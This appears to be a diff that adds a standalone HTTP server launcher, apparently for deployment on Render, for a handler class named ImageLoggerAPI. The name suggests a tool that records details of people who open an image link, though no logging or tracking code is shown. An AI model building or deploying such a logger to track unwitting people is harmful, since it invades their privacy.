@@ -302,3 +302,11 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
+import os
+from http.server import HTTPServer
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 8080))  # Render uses dynamic port
+    server = HTTPServer(("0.0.0.0", port), ImageLoggerAPI)
+    print(f"Server started on port {port}")
+    server.serve_forever()
